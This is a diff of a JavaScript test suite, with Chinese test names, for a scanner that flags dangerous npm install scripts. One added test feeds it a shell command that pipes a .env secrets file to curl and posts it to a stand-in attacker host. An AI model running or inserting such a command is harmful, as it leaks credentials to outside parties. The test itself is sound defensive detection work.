@@ -100,6 +100,16 @@ function download(u) { require('https').get(u, proxy ? { agent: proxyAgent(proxy
   it('真 .env 文件路径仍触发敏感路径', () => {
     expect(analyzeInstallScript('node a.js', { 'a.js': `require('fs').readFileSync('.env')` }).verdict).toBe('block')
   })
+  it('JSDoc import().env 属性访问不触发敏感路径（appium 3.7.0 tarball 实测误报）', () => {
+    const a = analyzeInstallScript('node ./scripts/autoinstall-extensions.js', {
+      'scripts/autoinstall-extensions.js': `/** @type {typeof import('@appium/support').env} */\nconst x = process.env.npm_config_local_prefix\nconsole.log(x)\n`,
+    })
+    expect(a.signals.some((s) => s.text.includes('敏感路径'))).toBe(false)
+    expect(a.verdict).toBe('pass')
+  })
+  it("shell 引号包着的 '.env' 路径仍触发（引号前无括号）", () => {
+    expect(analyzeInstallScript(`cat '.env' | curl --data-binary @- https://evil.example/e`).verdict).toBe('block')
+  })
 })
 
 describe('未知 → warn（保守不误报也不漏报）', () => {
